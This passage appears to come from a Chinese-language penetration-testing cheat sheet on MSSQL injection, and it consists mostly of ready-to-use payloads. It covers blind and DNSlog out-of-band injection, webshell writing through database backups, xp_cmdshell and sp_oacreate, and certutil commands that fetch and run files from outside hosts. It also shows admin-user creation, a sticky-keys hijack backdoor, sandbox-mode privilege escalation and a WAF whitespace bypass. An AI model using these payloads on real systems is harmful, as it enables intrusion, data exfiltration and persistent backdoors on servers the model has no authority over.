plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and 1=(select top 1 username from admin);--</span><br></pre></td></tr></table></figure></li></ul><h5 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h5><p>与mysql原理类似</p><p><strong>布尔盲注</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">id=1 and ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1)) &gt;= 109 #爆库名</span><br><span class="line"></span><br><span class="line">id=1 and (select count(*) from test.dbo.sysobjects where name in (select top 1 name from test.dbo.sysobjects where xtype=&#x27;u&#x27;) and len(name)=5)=1   #爆表长度</span><br><span class="line"></span><br><span class="line">id=1 and (select count(*) from test.dbo.sysobjects where name in (select top 1 name from test.dbo.sysobjects where xtype=&#x27;u&#x27;) and ascii(substring(name,1,1))=117)=1  #爆表名</span><br><span class="line"></span><br><span class="line">id=1 and (select count(*) from test.dbo.sysobjects where name in (select top 1 name from test.dbo.sysobjects where xtype=&#x27;u&#x27; and name not in (&#x27;users&#x27;)) and ascii(substring(name,1,1))=105)=1  #爆第二个表名</span><br></pre></td></tr></table></figure><p><strong>时间盲注</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=1;if (select IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;))=1 WAITFOR DELAY &#x27;0:0:5&#x27;--</span><br><span class="line"></span><br><span class="line">id=1;if (ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1)))&gt;1 WAITFOR DELAY &#x27;0:0:5&#x27;--</span><br></pre></td></tr></table></figure><blockquote><p>前提是能用堆叠，利用<code>waitfor delay &#39;*&#39;</code>延时，’0.0.5’表示小时、分钟、秒</p></blockquote><p><strong>dnslog外带注入</strong>:</p><p>前提是<strong>能堆叠，且权限为sa</strong></p><p>原理是用xp_subdirs，xp_dirtree, xp_fileexist三个扩展存储过程，读取smb共享域名。也有用OpenRowset()和OpenDatasource()的办法，这两个函数为远程加载其他mssql数据库，默认关闭。</p><p>xp_subdirs：<strong>用于列出指定目录的子目录</strong>。</p><p>xp_dirtree：<strong>递归列出指定目录的所有子目录和文件</strong>。</p><p>xp_fileexist：<strong>检查指定文件或目录是否存在</strong>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">declare @host varchar(1024);</span><br><span class="line">select @host=convert(varchar(1024),db_name())+&#x27;.vj0r9q.dnslog.cn&#x27;;</span><br><span class="line">exec(&#x27;master..xp_subdirs &quot;\\&#x27;+@host+&#x27;&quot;&#x27;); --xp_subdirs 尝试访问 \\db_name().vj0r9q.dnslog.cn，这会触发一次 DNS 解析请求。</span><br></pre></td></tr></table></figure><blockquote><p>declare声明变量</p></blockquote><p>或者：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec(&#x27;master..xp_dirtree &quot;\\&#x27;+@host+&#x27;&quot;&#x27;);</span><br><span class="line">exec(&#x27;master..xp_fileexist &quot;\\&#x27;+@host+&#x27;\test&quot;&#x27;);</span><br></pre></td></tr></table></figure><p>也有无需堆叠的方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and exists(select * from fn_xe_file_target_read_file(&#x27;C:\Windows\win.ini&#x27;,&#x27;\\&#x27;+(select user)+&#x27;.a72ita.dnslog.cn\1.xem&#x27;,null,null))</span><br><span class="line">and exists(select * from fn_get_audit_file(&#x27;\\&#x27;+(select user)+&#x27;.a72ita.dnslog.cn\1.xem&#x27;,null,null))</span><br><span class="line">and exists(select * from fn_trace_gettable(&#x27;\\&#x27;+(select user)+&#x27;.xrjff0.dnslog.cn\1.trc&#x27;,null))</span><br></pre></td></tr></table></figure><blockquote><p><code>fn_xe_file_target_read_file</code>:用于读取 SQL Server 扩展事件（Extended Events）的目标文件。第二个参数本应是扩展事件文件路径，这里换成我们的查询语句通过UNC 路径会触发DNS请求</p><p><code>fn_get_audit_file</code>：用于读取SQL Server 审计日志文件。</p><p><code>fn_trace_gettable</code>：用于读取 SQL Server 跟踪文件</p></blockquote><h4 id="mssql-getshell"><a href="#mssql-getshell" class="headerlink" title="mssql getshell"></a>mssql getshell</h4><p>注意，除了备份写shell其他都要sa权限</p><h5 id="获取网站绝对路径"><a href="#获取网站绝对路径" class="headerlink" title="获取网站绝对路径"></a>获取网站绝对路径</h5><ul><li><p><strong>报错寻找</strong></p></li><li><p><strong>通过配置文件</strong></p></li><li><p><strong>字典爆破</strong></p></li><li><p><strong>cmd搜索文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for %i in (c d e f g h i j k l m n o p q r s t u v w x v z) do @(dir/s/b %i:\sql.aspx)</span><br></pre></td></tr></table></figure><blockquote><p><code>/s</code>:列出所有子目录下的文件和文件夹</p><p><code>/b</code>:只列出路径和文件名，别的属性全部不显示</p></blockquote></li><li><p><strong>旁站信息收集</strong></p><p>找旁站有没有泄露绝对路径</p></li><li><p><strong>存储过程来搜索</strong></p><p><code>xp_cmdshell</code>：直接执行系统命令。</p><p><code>xp_dirtree</code>：递归列出指定目录的所有子目录和文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">execute master..xp_dirtree &#x27;c:&#x27; --列出所有c:\文件、目录、子目录 </span><br><span class="line">execute master..xp_dirtree &#x27;c:&#x27;,1 --只列c:\目录</span><br><span class="line">execute master..xp_dirtree &#x27;c:&#x27;,1,1 --列c:\目录、文件</span><br></pre></td></tr></table></figure><p>xp_cmdshell我们可以建立一个表，将我们的cmd查询结果写入表中，再查询表即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=1;CREATE TABLE cmdtmp (dir varchar(8000));</span><br><span class="line"></span><br><span class="line">id=1;insert into cmdtmp(dir) exec master..xp_cmdshell &#x27;for /r c:\ %i in (1*.aspx) do @echo %i&#x27;</span><br></pre></td></tr></table></figure><blockquote><p><code>\r</code>：递归搜索</p></blockquote><p>SQL Server 阻止了对组件 <code>xp_cmdshell</code> 的过程 <code>sys.xp_cmdshell</code> 的访问，因为此组件已作为此服务器安全配置的一部分而被<strong>关闭</strong>。如果xp_cmdshell不能调用，可通过使用<strong>sp_configgure启用（需要sysadmin权限）</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 允许修改高级参数 </span><br><span class="line">;EXEC sp_configure &#x27;show advanced options&#x27;,1;RECONFIGURE;</span><br><span class="line"></span><br><span class="line">// 打开xp_cmdshell 扩展</span><br><span class="line">;EXEC sp_configure &#x27;xp_cmdshell&#x27;,1;RECONFIGURE;--</span><br></pre></td></tr></table></figure></li></ul><h5 id="备份写shell"><a href="#备份写shell" class="headerlink" title="备份写shell"></a>备份写shell</h5><h6 id="差异备份写shell"><a href="#差异备份写shell" class="headerlink" title="差异备份写shell"></a>差异备份写shell</h6><p>条件：</p><ul><li><p><strong>至少DBO权限</strong></p></li><li><p><strong>前提知道绝对路径，路径可写。</strong></p></li><li><p><strong>HTTP 500错误不是自定义</strong></p></li><li><p><strong>WEB和数据在一块。还有的就是数据库中不能存在%号之类的，不然也是不成功的。</strong></p></li><li><p><strong>数据量不能太大</strong></p></li></ul><p>流程：</p><ul><li><p><strong>手动完整备份文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;backup database 库名 to disk = &#x27;c:\bak.bak&#x27; ;--</span><br></pre></td></tr></table></figure><blockquote><p>to disk：指定备份的目标位置为磁盘。</p><p>‘c:\bak.bak’：备份文件的完整路径和文件名。</p></blockquote><p>如果<strong>过滤了特殊的字符比如单引号</strong>，可以用<strong>定义局部变量来执行</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;declare @a sysname,@s varchar(4000) select @a=db_name(),@s=0x备份路径\xx.bak backup database @a to disk=@s--     </span><br><span class="line">//0x备份的数据库名转换成16位进制,db_name()里面可以加数字备份不同的数据库</span><br></pre></td></tr></table></figure></li><li><p><strong>创建恶意表并插入shell</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">;create table 数据库名..表名(a image)--</span><br><span class="line"></span><br><span class="line">;insert into 数据库名..表名(a) values (0x3C25657865637574652872657175657374282261222929253E)--</span><br><span class="line">//&lt;%execute(request(&quot;a&quot;))%&gt;</span><br></pre></td></tr></table></figure></li><li><p><strong>差异备份到asp文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;backup database 库名 to disk = &#x27;c:\shell.asp&#x27; with differential , format ;--</span><br></pre></td></tr></table></figure><blockquote><p><code>WITH DIFFERENTIAL</code>：表示差异备份，仅备份自上次完整备份后的变化。</p><p><code>WITH FORMAT</code>：覆盖现有备份文件，确保写入成功。</p></blockquote><p>此时会将完整备份 <code>C:\bak.bak</code>所有的变更(新创建的 <code>test</code> 表和插入的恶意数据)都写入到<code>c:\shell.asp</code>文件中</p><p>如果<strong>过滤了特殊的字符比如单引号</strong>，可以用<strong>定义局部变量来执行</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;declare @a sysname,@s varchar(4000) select @a=db_name(),@s=0x备份路径\xx.asp backup database @a to disk=@s WITH DIFFERENTIAL,FORMAT--     </span><br><span class="line">//备份到路径\xx.asp，前提是已得知路径，注意转换为16进制,假如备份的路径为c:\webroot\shell.asp </span><br></pre></td></tr></table></figure></li><li><p><strong>备份完getshell后删除表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;Drop table 数据库..表名--</span><br></pre></td></tr></table></figure></li></ul><p>差异备份有多种情况可能不成功，一般就是目录权限的问题，一般不要直接备份到 c 盘根目录</p><h6 id="LOG备份"><a href="#LOG备份" class="headerlink" title="LOG备份"></a>LOG备份</h6><p>前提：</p><ul><li><p><strong>至少DBO权限</strong></p></li><li><p><strong>前提得知绝对路径，并且可写</strong></p></li><li><p><strong>站库不分离</strong></p></li><li><p><strong>数据库必须被备份过一次</strong></p></li></ul><p>原理就是通过<strong>导出日志文件到web路径来getshell</strong></p><p>LOG备份的好处就是备份出来的webshell的<strong>文件大小非常的小</strong></p><p>流程：</p><ul><li><p><strong>数据库启用完整恢复模式</strong></p><p>数据库启用完整恢复功能后，会记录所有事务日志</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;alter database 库名 set RECOVERY FULL--</span><br></pre></td></tr></table></figure></li><li><p><strong>创建恶意表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;create table 数据库名..表名(a image)--</span><br></pre></td></tr></table></figure><blockquote><p>image类型用于存储二进制数据（如文本、脚本）</p></blockquote></li><li><p><strong>事务日志备份</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;backup log 库名 to disk=&#x27;c:\xxx&#x27; with init</span><br></pre></td></tr></table></figure><blockquote><p><code>with init</code>：覆盖现有备份日志，创建一个新的日志链起点</p></blockquote></li><li><p><strong>插入shell</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;insert into 数据库名..表名 (a) values (0x3C25657865637574652872657175657374282261222929253E)</span><br><span class="line">//&lt;%execute(request(&quot;a&quot;))%&gt;</span><br></pre></td></tr></table></figure></li><li><p><strong>再次备份事务日志，生成恶意文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;backup log 库名 to disk = &#x27;c:\xxx\2.asp&#x27;</span><br></pre></td></tr></table></figure><blockquote><p>会包含第一次备份以来的新事务日志，即插入shell的操作</p></blockquote></li><li><p><strong>删除表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;Drop table 数据库名..表名--</span><br></pre></td></tr></table></figure></li></ul><h5 id="存储过程写shell"><a href="#存储过程写shell" class="headerlink" title="存储过程写shell"></a>存储过程写shell</h5><p>前提：</p><ul><li><strong>拥有DBA权限</strong></li><li><strong>知道的网站绝对路径</strong></li></ul><p>扩展存储过程：是mssql提供的特殊功能，本质上就是一个普通的Windows系统DLL文件，按照某种规则实现了某些函数功能。</p><p>常用的扩展存储功能：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshell—利用此存储过程可以直接执行系统命令。</span><br><span class="line">xp_regread—利用此存储过程可以进行注册表读取。</span><br><span class="line">xp_regwrit一利用此存储过程可以写入注册表。</span><br><span class="line">xp_dirtre一利用此存储过程可以进行列目录操作。</span><br><span class="line">xp_enumds—利用此存储过程可以进行ODBC连接。</span><br><span class="line">xp_loginconfig-利用此存储过程可以配置服务器安全模式信息。</span><br><span class="line">xp_makecab一一利用此存储过程可以创建压缩卷。</span><br><span class="line">xp_ntsec_enumdomains-利用此存储过程可以查看domain信息。</span><br><span class="line">xp_terminate_jroces一利用此存储过程可以查看终端进程，给出一个进程PID.</span><br><span class="line">sp_oacreate-SQL Server 中的 OLE 自动化存储过程，用于创建COM对象实例</span><br><span class="line">sp_oamethod-SQL Server 中的 OLE 自动化存储过程，调用已创建的 COM 对象的方法。</span><br></pre></td></tr></table></figure><h6 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h6><p>xp_cmdshell利用（一般都是sqlmap执行–os-shell后)：</p><ul><li><p><strong>开启xp_cmdshell</strong></p><p>在 SQL Server 2005以后默认关闭，需要利用sp_configure手动开启（需要sysadmin权限）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#开启高级选项</span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line"># 配置生效</span><br><span class="line">RECONFIGURE;</span><br><span class="line"># 开启xp_cmdshell，配置生效</span><br><span class="line">exec sp_configure&#x27;xp_cmdshell&#x27;, 1;RECONFIGURE;</span><br></pre></td></tr></table></figure></li><li><p><strong>echo写shell</strong></p><p>前提是知道<strong>web目录的绝对路径</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1;exec master..xp_cmdshell &#x27;echo ^&lt;%@ Page Language=&quot;Jscript&quot;%^&gt;^&lt;%eval(Request.Item[&quot;cmd&quot;],&quot;unsafe&quot;);%^&gt; &gt; c:\\WWW\\404.aspx&#x27; ;</span><br></pre></td></tr></table></figure><blockquote><p><code>^</code>是转义字符用于转义<code>&lt;&gt;</code></p></blockquote><p>当<strong>路径为中文时不建议echo写马</strong></p><p><strong>一般利用sqlmap <code>--file-write</code>写bat文件getshell</strong></p><p>但注意mssql一般使用<strong>gb2312编码</strong>，而sqlmap <strong>echo写马使用utf-8编码</strong>，为了写马，常常需要在对方文件写一个bat执行文件，而asp的木马中 % 文件跟bat不兼容，所以我们手工写的需要将sqlmap代理到burp，抓包<strong>修改utf-8编码的hex改为gb2312编码的hex值</strong></p><p>或者使用远程下载免杀🐎：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=3;exec master..xp_cmdshell &quot;certutil -urlcache -split -f http://test1.com/shell.aspx  d:\test\shell.aspx&quot; --</span><br></pre></td></tr></table></figure><blockquote><p>Certutil是Windows系统中的一个命令行工具，在渗透测试中常用来下载文件、编码解码数据</p><p><code>-urlcache</code>：启用 URL 缓存。</p><p><code>-split</code>：分割输出。</p><p><code>-f</code>：强制覆盖现有文件。</p></blockquote></li></ul><h6 id="sp-oacreate"><a href="#sp-oacreate" class="headerlink" title="sp_oacreate"></a>sp_oacreate</h6><p><code>sp_oacreate</code>：SQL Server 中的 OLE 自动化存储过程，用于<strong>创建COM对象实例</strong><br><code>sp_oamethod</code>：SQL Server 中的 OLE 自动化存储过程，调用<strong>已创建的 COM 对象的方法</strong></p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DECLARE @object_id INT;</span><br><span class="line">EXEC sp_oacreate &#x27;COM组件名称&#x27;, @object_id OUTPUT;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_oamethod @object_id, &#x27;方法名&#x27;, [返回变量], 参数1, 参数2, ...;</span><br></pre></td></tr></table></figure><p>利用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-- 首先判断当前是否为DBA权限，为1则可以提权</span><br><span class="line">select is_srvrolemember(&#x27;sysadmin&#x27;);</span><br><span class="line"></span><br><span class="line">-- 利用存储过程写入一句话,注意路径</span><br><span class="line">declare @o int, @f int, @t int, @ret int</span><br><span class="line">exec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @o out</span><br><span class="line">exec sp_oamethod @o, &#x27;createtextfile&#x27;, @f out, &#x27;C:\www\test.asp&#x27;, 1</span><br><span class="line">exec @ret = sp_oamethod @f, &#x27;writeline&#x27;, NULL,&#x27;&lt;%execute(request(&quot;a&quot;))%&gt;&#x27;</span><br></pre></td></tr></table></figure><blockquote><p>创建文件系统对象<code>scripting.filesystemobject</code>，并调用其<code>createtextfile</code>方法创建test.asp文件，同时将创建的文件对象引用存储在变量 <code>@f</code> 中。最后通过writeline将shell写入文件中</p></blockquote><h4 id="mssql提权"><a href="#mssql提权" class="headerlink" title="mssql提权"></a>mssql提权</h4><h5 id="xp-cmdshell-1"><a href="#xp-cmdshell-1" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h5><p>测试xp_cmdshell是否可执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#x27;ver&#x27;</span><br></pre></td></tr></table></figure><blockquote><p>执行会显示当前操作系统的版本信息。</p></blockquote><p><strong>添加管理员用户</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#创建一个用户q添加到本地组组</span><br><span class="line">exec master.dbo.xp_cmdshell &#x27;net user q 123456q /add&#x27;</span><br><span class="line">#将本地组q添加管理员组</span><br><span class="line">exec master.dbo.xp_cmdshell &#x27;net localgroup administrators q /add&#x27;</span><br></pre></td></tr></table></figure><blockquote><p>&#x2F;add是一个参数，表示执行添加用户的操作</p><p><code>net user</code>：管理用户账户</p><p><code>net localgroup</code>：管理本地组</p></blockquote><p><strong>下载执行恶意程序</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exec master.dbo.xp_cmdshell &#x27;cd c:\www &amp; certutil -urlcache -split -f http://192.168.130.142:80/download/file.exe&#x27;;</span><br><span class="line"></span><br><span class="line">exec master.dbo.xp_cmdshell &#x27;cd c:\www &amp; file.exe&#x27;;</span><br></pre></td></tr></table></figure><h5 id="sp-oacreate-1"><a href="#sp-oacreate-1" class="headerlink" title="sp_oacreate"></a>sp_oacreate</h5><p><strong>sp_oacreate</strong> 是一个非常危险的存储过程可以<strong>删除、复制、移动文件</strong>。还能配合 <strong>sp_oamethod</strong> 来写文件执行 cmd。</p><p>当xp_cmdshell被删除可以使用sp_oacreate来提权</p><p><strong>恢复sp_oacreate</strong>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 开启sp_oacreate</span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;,1;reconfigure;</span><br><span class="line">exec sp_configure &#x27;ole automation procedures&#x27;,1;reconfigure;</span><br><span class="line"></span><br><span class="line"># 关闭sp_oacreate</span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;,1;reconfigure;</span><br><span class="line">exec sp_configure &#x27;ole automation procedures&#x27;,0;reconfigure;</span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;,0;reconfigure;</span><br><span class="line"></span><br><span class="line"># 查看 sp_oacreate 状态</span><br><span class="line">exec sp_configure;</span><br></pre></td></tr></table></figure><blockquote><p><code>ole automation procedures</code>：OLE 自动化过程，允许 SQL Server 可以通过 OLE 自动化接口与外部应用程序进行交互。</p></blockquote><p><strong>执行cmd:</strong></p><p><code>wscript.shell</code>：是 Windows Script Host (WSH) 中的一个 COM 对象，它提供了与 Windows 操作系统进行交互的功能，通常用于<strong>执行系统命令、运行程序、设置环境变量</strong>等。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">declare @shell int</span><br><span class="line">exec sp_oacreate &#x27;wscript.shell&#x27;, @shell output</span><br><span class="line">exec sp_oamethod @shell, &#x27;run&#x27;, null, &#x27;c:\windows\system32\cmd.exe /c xxx&#x27;</span><br></pre></td></tr></table></figure><blockquote><p>&#x2F;c表示<code>cmd.exe</code> 执行完命令后关闭命令行窗口。xxx指任意命令或脚本。</p></blockquote><p><code>Shell.Application</code>：是另一个 Windows Shell COM 对象，它能提供了比 <code>WScript.Shell</code> 更多的功能，尤其是与 Windows Shell 进行交互的功能。通过 <code>Shell.Application</code>同样可以<strong>执行文件、显示文件夹、启动进程</strong>等。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">declare @o int</span><br><span class="line">exec sp_oacreate &#x27;Shell.Application&#x27;, @o out</span><br><span class="line">exec sp_oamethod @o, &#x27;ShellExecute&#x27;, null, &#x27;cmd.exe&#x27;, &#x27;cmd /c net user &gt;c:\test.txt&#x27;, &#x27;c:\windows\system32&#x27;, &#x27;&#x27;, &#x27;1&#x27;;</span><br></pre></td></tr></table></figure><blockquote><p><code>&#39;cmd /c net user &gt; c:\test.txt&#39;</code>：会执行 <code>net user</code> 命令（列出所有用户），并将输出重定向到 <code>c:\test.txt</code> 文件中。</p><p><code>&#39;c:\windows\system32&#39;</code>：执行命令时的工作目录</p></blockquote><p><strong>提权：</strong></p><p>一样的，只用把执行的命令换成提权的命令就行了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">declare @o INT</span><br><span class="line">exec sp_oacreate &#x27;wscript.shell&#x27;,@o output</span><br><span class="line">exec sp_oamethod @o,&#x27;run&#x27;,null,&#x27;net user hack hack /add&#x27;,&#x27;0&#x27;,&#x27;true&#x27;;</span><br><span class="line">exec sp_oamethod @o,&#x27;run&#x27;,null,&#x27;net localgroup administrators hack /add&#x27;,&#x27;0&#x27;,&#x27;true&#x27;;</span><br></pre></td></tr></table></figure><p><code>Shell.Application</code>方法一样</p><h5 id="沙盒提权"><a href="#沙盒提权" class="headerlink" title="沙盒提权"></a>沙盒提权</h5><p><strong>沙盒模式</strong>是数据库的一种安全功能。在沙盒模式下，只对控件和字段属性中的安全且不含恶意代码的表达式求值。如果表达式不使用可能以某种方式损坏数据的函数或属性，则可认为它是安全的。</p><p>利用前提：</p><ul><li><code>xp_regwrite</code> 可用(使用条件)</li><li>拥有 DBA 权限</li><li>服务器拥有 jet.oledb.4.0 驱动</li></ul><p>原理就是对注册表的操作，依赖<strong>xp_regwrite</strong>存储过程对注册表修改，且<strong>服务器拥有 jet.oledb.4.0 驱动。</strong></p><p><strong>开启沙盒模式</strong>：</p><p>注册表中沙盒模式的位置在：<code>HKEY_LOCAL_MACHINE\Software\Microsoft\Jet\4.0\Engine\SandBoxMode</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#win2003</span><br><span class="line">exec master..xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,&#x27;SandBoxMode&#x27;,&#x27;REG_DWORD&#x27;,1</span><br></pre></td></tr></table></figure><blockquote><p>修改注册表中Jet 4.0引擎的SandBoxMode值为1</p></blockquote><p><strong>SandBoxMode参数含义（默认为2）</strong>：</p><ul><li><code>0</code>：在任何所有者中禁止启用安全模式</li><li><code>1</code> ：为仅在允许范围内</li><li><code>2</code> ：必须在access模式下</li><li><code>3</code>：完全开启</li></ul><p><strong>利用 jet.oledb 执行系统命令添加用户:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from openrowset(&#x27;microsoft.jet.oledb.4.0&#x27; ,&#x27;;database=c:\windows\system32\ias\ias.mdb&#x27; ,&#x27;select shell(&quot;cmd.exe /c net user q 123456q /add&quot;)&#x27;)</span><br></pre></td></tr></table></figure><p><strong>将 q 用户添加至管理员组:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from openrowset(&#x27;microsoft.jet.oledb.4.0&#x27; ,&#x27;;database=c:\windows\system32\ias\ias.mdb&#x27; ,&#x27;select shell(&quot;cmd.exe /c net localgroup administrators q /add&quot;)&#x27;)</span><br></pre></td></tr></table></figure><h5 id="利用映像劫持提权"><a href="#利用映像劫持提权" class="headerlink" title="利用映像劫持提权"></a>利用映像劫持提权</h5><p>原理就是利用xp_regwrite函数修改注册表，起到劫持作用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Image File Execution</span><br><span class="line">Options\sethc.EXE&#x27;,&#x27;Debugger&#x27;,&#x27;REG_SZ&#x27;,&#x27;c:\windows\system32\cmd.exe&#x27;;</span><br></pre></td></tr></table></figure><blockquote><p><code>sethc.exe</code> 是 Windows 系统中的 “Sticky Keys” (粘滞键) 实用程序，它通常是通过按下 Shift 键五次启动的，用于帮助那些有肢体障碍的用户。</p></blockquote><p>当按下 Shift 键五次后系统会以<code>SYSTEM</code>权限运行<code>cmd.exe</code></p><h5 id="CLR提权"><a href="#CLR提权" class="headerlink" title="CLR提权"></a>CLR提权</h5><p>CLR（公共语言运行库）集成是 SQL Server2005 出现的新功能，它将 .NET Framework 中的 CLR 服务注入到 SQL Server 中，允许在数据库中执行 .NET 程序。攻击者可以利用 CLR 提供的能力编写恶意代码，执行操作系统命令。以后再研究吧</p><p>可以使用<strong>SharpSQLTools</strong>工具</p><h4 id="bypass-1"><a href="#bypass-1" class="headerlink" title="bypass"></a>bypass</h4><h5 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a>绕过空格</h5><ul><li><p>特殊字符<code>%C2%85(U+0085,控制字符(NEL))</code>、<code>%C2%A0(U+00A0,不换行空格)</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%C2%85union%C2%85select%C2%A0null,@@version,null--</span><br></pre></td></tr></table></figure></li></ul><h3 id="oracle注入"><a href="#oracle注入" class="headerlink" title="oracle注入"></a>oracle注入</h3><h4 